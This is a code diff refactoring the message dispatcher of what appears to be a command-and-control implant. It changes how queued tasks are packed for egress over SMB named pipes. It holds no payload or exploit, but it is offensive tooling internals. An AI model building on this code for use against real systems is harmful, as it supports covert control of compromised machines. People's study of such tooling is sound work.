@@ -1,6 +1,5 @@
 #include <core/include/dispatch.hpp>
 namespace Dispatcher {
-
     DWORD PeekPeerId(const _stream *const stream) {
         HEXANE
 
@@ -127,45 +126,34 @@ namespace Dispatcher {
         }
     }
 
-    BOOL PrepareEgressMessage(_stream *out) {
+    VOID PrepareEgressMessage(_stream *out) {
         HEXANE
 
-        _stream *head   = Ctx->transport.outbound_queue;
         _parser parser  = { };
-        bool success    = true;
-
-        while (head) {
+        for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
             if (B_PTR(head->buffer)[0] != 0) {
-                continue; // if a message is inbound , don't process it
+                continue;
             }
-            if (head->buffer) {
-                if (head->length + HEADER_SIZE + out->length + 4 > MESSAGE_MAX) {
-                    break; // if the stream if full, exit
-                }
 
-                Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
-                Stream::PackDword(out, head->peer_id);
-                Stream::PackDword(out, head->task_id);
-                Stream::PackDword(out, head->msg_type);
+            Parser::CreateParser(&parser, B_PTR(head->buffer), head->length);
+            Stream::PackDword(out, head->peer_id);
+            Stream::PackDword(out, head->task_id);
+            Stream::PackDword(out, head->msg_type);
 
-                if (Ctx->root) {
-                    Stream::PackBytes(out, B_PTR(head->buffer), head->length);
-                } else {
-                    out->buffer = x_realloc(out->buffer, out->length + head->length);
-                    x_memcpy(B_PTR(out->buffer) + out->length, head->buffer, head->length);
-                    out->length += head->length;
-                }
+            if (Ctx->root) {
+                Stream::PackBytes(out, B_PTR(head->buffer), head->length);
             } else {
-                success = false;
-                return_defer(ERROR_INVALID_DATA);
+                Utils::AppendBuffer(&out->buffer, head->buffer, R_CAST(uint32_t*, &out->length), head->length);
             }
 
-            head = head->next;
+            break;
         }
 
+
         defer:
-        Parser::DestroyParser(&parser);
-        return success;
+        if (parser.buffer) {
+            Parser::DestroyParser(&parser);
+        }
     }
 
     VOID PrepareIngressMessage(_stream *in){
@@ -214,9 +202,6 @@ namespace Dispatcher {
         Network::Smb::PipeSend(out);
         Network::Smb::PipeReceive(&in);
 #endif
-        if (out->self) {
-            Dispatcher::RemoveMessage(out->self);
-        }
         Stream::DestroyStream(out);
         Dispatcher::PrepareIngressMessage(in);
 
